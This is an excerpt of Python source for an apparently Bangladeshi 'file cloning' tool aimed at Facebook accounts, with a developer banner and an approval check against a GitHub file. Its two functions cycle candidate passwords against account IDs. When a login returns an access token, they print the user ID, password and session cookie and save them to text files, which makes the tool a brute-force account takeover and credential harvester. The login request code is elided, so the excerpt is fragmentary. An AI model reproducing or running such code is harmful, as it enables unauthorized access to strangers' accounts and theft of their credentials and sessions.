...
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            ADNAN SHEIKH 
     \033[1;91m➣ \033[1;91mFACEBOOK   :            FARDIN MAHMUD 
     \033[1;92m➣ \033[1;92mWHATSAPP   :            ERROR 
     \033[1;91m➣ \033[1;91mGITHUB     :            ADNANSHEIKH404
     \033[1;92m➣ \033[1;92mTOOLS      :            FILE CLONING
     \033[1;92m➣ \033[1;92mVERSION    :            0.1
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••
"""
def linex():
        print(f'{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆')
...
def menu():
  ...
  try:
    httpCaht = requests.get('https://github.com/BD-CYBER10/Adnan/blob/main/Approval.txt').text    
    if id in httpCaht:
...
def FIREX(ids,pwv,tl):
    ...
    'viewport-width': '980',
            ...
            if 'access_token' in po:
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\r {bblack}[{G}ADNAN-OK{bblack}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bblack}[{G}•{bblack}]{G} '+kuki+'')
                linex()
                open('/sdcard/ADNAN-RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def M3Z(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mADNAN-M3\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
    ...
    'viewport-width': '980',
            ...
            if 'access_token' in po:
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\r {badnan}[{G}ADNAN-OK{badnan}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {badnan}[{G}•{badnan}]{G} '+kuki+'')
                linex()
                open('/sdcard/ADNAN-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
